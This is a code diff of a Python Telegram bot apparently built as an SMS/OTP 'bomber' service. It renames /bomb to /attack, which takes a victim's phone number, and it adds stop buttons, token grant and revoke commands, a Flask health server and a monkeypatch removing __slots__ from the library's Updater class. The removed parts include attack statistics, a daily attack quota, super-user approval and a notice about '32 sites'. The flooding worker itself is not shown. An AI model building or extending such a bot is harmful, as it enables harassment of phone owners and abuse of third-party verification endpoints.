+        "Example: `/attack 01712345678`\n\n"
+        "The `/bomb` command is outdated. Please use `/attack` from now on.",
         parse_mode='Markdown'
     )
-    
-    # Start bombing in thread
-    thread = threading.Thread(
-        target=bombing_worker,
-        args=(chat_id, full_number, clean_number, raw_number, user_id, user.username or user.first_name)
-    )
-    thread.daemon = True
-    thread.start()
 
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /stop command"""
     user_id = update.effective_user.id
     
     if user_id in active_attacks:
         active_attacks[user_id]['stop'] = True
-        await update.message.reply_text("🛑 Stopping attack...", parse_mode='Markdown')
+        await update.message.reply_text("🛑 Stopping your attack...")
     else:
-        await update.message.reply_text("❌ No active attack found!", parse_mode='Markdown')
+        await update.message.reply_text("❌ You have no active attacks.")
 
-async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /stats command"""
-    user = update.effective_user
-    user_id_str = str(user.id)
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
     
-    if user_id_str in bot_users:
-        data = bot_users[user_id_str]
-        super_status = "⭐ SUPER USER" if user.id in super_users else "👤 NORMAL USER"
-        remaining = ""
-        if user.id not in super_users:
-            used = data.get('daily_attacks', 0)
-            remaining = f"\n📊 Today's Attacks: {used}/3\n"
-        
-        stats_text = (
-            f"📊 **YOUR STATS**\n\n"
-            f"👤 Username: @{data['username'] or 'None'}\n"
-            f"📝 Name: {data['first_name']}\n"
-            f"⭐ Status: {super_status}\n"
-            f"🕐 First Seen: {data['first_seen']}\n"
-            f"🕒 Last Seen: {data['last_seen']}\n"
-            f"💣 Total Attacks: {data['total_attacks']}\n"
-            f"💬 Total Messages: {data['total_messages']}"
-            f"{remaining}"
-        )
-        await update.message.reply_text(stats_text, parse_mode='Markdown')
-    else:
-        await update.message.reply_text("❌ No stats found!", parse_mode='Markdown')
-
-async def server_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /server command"""
-    uptime = datetime.now() - datetime.strptime(bot_stats['start_time'], "%Y-%m-%d %H:%M:%S")
-    hours = uptime.total_seconds() // 3600
-    minutes = (uptime.total_seconds() % 3600) // 60
-    
-    server_text = (
-        f"🖥️ **SERVER STATUS**\n\n"
-        f"Status: 🟢 **ONLINE**\n"
-        f"Started: {bot_stats['start_time']}\n"
-        f"Uptime: {int(hours)}h {int(minutes)}m\n"
-        f"👥 Total Users: {bot_stats['total_users']}\n"
-        f"💣 Total Attacks: {bot_stats['total_attacks']}\n"
-        f"⭐ Super Users: {len(super_users)}\n"
-        f"👨‍💻 Developer: `Mr.MorningStar`"
-    )
-    await update.message.reply_text(server_text, parse_mode='Markdown')
-
-async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /broadcast command - admin only"""
-    user_id = update.effective_user.id
-    
-    if user_id not in super_users:
-        await update.message.reply_text("❌ You don't have permission to broadcast!")
-        return
-    
-    if not context.args:
-        await update.message.reply_text("Usage: /broadcast <message>")
-        return
-    
-    message = ' '.join(context.args)
-    await update.message.reply_text(f"📢 Broadcasting message to all users...")
-    
-    # Broadcast to all users
-    count = 0
-    for uid in bot_users:
-        try:
-            await context.bot.send_message(chat_id=int(uid), text=f"📢 **BROADCAST**\n\n{message}", parse_mode='Markdown')
-            count += 1
-            time.sleep(0.05)
-        except:
-            pass
-    
-    await update.message.reply_text(f"✅ Broadcast sent to {count} users!")
-
-async def stopall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /stopall command - admin only"""
-    user_id = update.effective_user.id
-    
-    if user_id not in super_users:
-        await update.message.reply_text("❌ You don't have permission to stop all attacks!")
-        return
-    
-    count = len(active_attacks)
-    if count > 0:
-        for uid in list(active_attacks.keys()):
-            active_attacks[uid]['stop'] = True
-        await update.message.reply_text(f"✅ Stopped {count} active attacks!")
-        log_activity(f"Admin {user_id} stopped all attacks")
-    else:
-        await update.message.reply_text("✅ No active attacks to stop!")
+    if query.data == f'stop_{user_id}':
+        if user_id in active_attacks:
+            active_attacks[user_id]['stop'] = True
+            await query.answer("🛑 Attack stopping...")
+            await query.edit_message_text("🛑 Attack stopped by user.")
+        else:
+            await query.answer("❌ No active attack.")
 
 def main():
-    """Start the bot"""
-    # Load saved data
     load_data()
-    
-    # Clear screen and show header
     clear_screen()
     
-    # Log server start
-    log_activity("Server started - Bot is now online with 32 sites!")
-    
-    # Send notification to all users that server is online
-    if bot_stats.get('total_users', 0) > 0:
-        online_msg = (
-            "🟢 **SERVER ONLINE NOTICE**\n\n"
-            "The bot server is now back online with 32 sites!\n"
-            "All sites are working like before.\n"
-            "You can resume using the bot.\n\n"
-            "**New Features:**\n"
-            "• Super User system\n"
-            "• Apply for unlimited attacks\n"
-            "• 3 attacks/day limit for normal users\n"
-            "• Admin approval system\n\n"
-            "Thank you for using @MorningStar_Bot"
-        )
-        
-        print("\n" + "="*60)
-        print("SENDING ONLINE NOTIFICATION TO ALL USERS...")
-        print("="*60)
-        
-        # Create a thread for notification to not block startup
-        notification_thread = threading.Thread(
-            target=notify_all_users,
-            args=(online_msg,)
-        )
-        notification_thread.daemon = True
-        notification_thread.start()
-        
-        print("✓ Notification sending in background...")
-        print("="*60 + "\n")
-    
     # Start terminal command thread
-    print("📟 Terminal commands available: Type 'help' for list\n")
-    print(f"🌐 Total Sites Loaded: 32")
-    print(f"⭐ Super Users: {len(super_users)}")
-    terminal_thread = threading.Thread(target=terminal_commands, daemon=True)
-    terminal_thread.start()
+    threading.Thread(target=terminal_commands, daemon=True).start()
     
-    # Create the Application
-    application = Application.builder().token(BOT_TOKEN).build()
-
-    # Register handlers
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("bomb", bomb_command))
-    application.add_handler(CommandHandler("stop", stop_command))
-    application.add_handler(CommandHandler("stats", stats_command))
-    application.add_handler(CommandHandler("server", server_command))
-    application.add_handler(CommandHandler("help", help_command))
-    application.add_handler(CommandHandler("apply", apply_superuser))
-    application.add_handler(CommandHandler("admin", admin_login))
-    application.add_handler(CommandHandler("approve", approve_superuser))
-    application.add_handler(CommandHandler("remove", remove_superuser))
-    application.add_handler(CommandHandler("listusers", list_superusers))
-    application.add_handler(CommandHandler("broadcast", broadcast_command))
-    application.add_handler(CommandHandler("stopall", stopall_command))
-    application.add_handler(CallbackQueryHandler(button_callback))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-
-    # Start the bot
-    print("🤖 Bot is running! Press Ctrl+C to stop.")
-    application.run_polling()
-
-if __name__ == '__main__':
+    # Start Flask server for health checks
     try:
-        main()
-    except KeyboardInterrupt:
-        print("\n\n⚠️ Keyboard interrupt received...")
-        server_shutdown()
-        sys.exit(0)
+        threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()
+        print("Flask health check server running on port 5000")
     except Exception as e:
-        print(f"\n❌ Error: {e}")
-        log_activity(f"Server error: {e}")
-        server_shutdown()
+        print(f"Warning: Could not start Flask server: {e}")
+    
+    # Fix Python 3.14 compatibility - remove __slots__ from Updater class
+    try:
+        from telegram.ext._updater import Updater
+        import telegram.ext._updater as updater_module
+        import types
+        
+        # Create a new class without __slots__ by copying all attributes
+        class_dict = {}
+        for key, value in Updater.__dict__.items():
+            if key != '__slots__':
+                class_dict[key] = value
+        
+        # Create new class with same name and bases, but no __slots__
+        NewUpdater = types.new_class(
+            'Updater',
+            Updater.__bases__,
+            exec_body=lambda ns: ns.update(class_dict)
+        )
+        
+        # Copy all class attributes that might have been missed
+        for attr in dir(Updater):
+            if not attr.startswith('__') or attr in ('__init__', '__doc__', '__module__'):
+                try:
+                    setattr(NewUpdater, attr, getattr(Updater, attr))
+                except:
+                    pass
+        
+        # Replace the Updater class in the module
+        updater_module.Updater = NewUpdater
+        print("✓ Removed __slots__ from Updater class for Python 3.14 compatibility")
+    except Exception as e:
+        print(f"Warning: Could not patch Updater: {e}")
+        print("Trying alternative method...")
+        try:
+            # Alternative: edit the __dict__ directly
+            from telegram.ext._updater import Updater
+            if '__slots__' in Updater.__dict__:
+                del Updater.__dict__['__slots__']
+                print("✓ Deleted __slots__ from Updater.__dict__")
+        except Exception as e2:
+            print(f"Alternative method failed: {e2}")
+    
+    # Create Telegram application
+    try:
+        application = Application.builder().token(BOT_TOKEN).build()
+        print("✓ Telegram Application created successfully")
+    except AttributeError as e:
+        print("\n" + "="*60)
+        print("ERROR: Telegram library compatibility issue!")
+        print("="*60)
+        print(f"Error: {e}")
+        print("\nThis version of python-telegram-bot may not support Python 3.14.")
+        print("Please downgrade to Python 3.12 or 3.11 for best compatibility.")
         sys.exit(1)
+    
+    # Add handlers
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("admin", admin_command))
+    application.add_handler(CommandHandler("logout", logout_command))
+    application.add_handler(CommandHandler("apply", apply_command))
+    application.add_handler(CommandHandler("grant", grant_command))
+    application.add_handler(CommandHandler("revoke", revoke_command))
+    application.add_handler(CommandHandler("mytokens", mytokens_command))
+    application.add_handler(CommandHandler("listusers", listusers_command))  # Admin only
+    application.add_handler(CommandHandler("attack", attack_command))
+    application.add_handler(CommandHandler("bomb", bomb_command))  # Redirect old /bomb command
+    application.add_handler(CommandHandler("stop", stop_command))
+    application.add_handler(CallbackQueryHandler(button_callback))
+    
+    print("="*60)
+    print("          BOT IS NOW RUNNING")
+    print("="*60)
+    
+    # Start polling
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
+
+if __name__ == "__main__":
+    main()
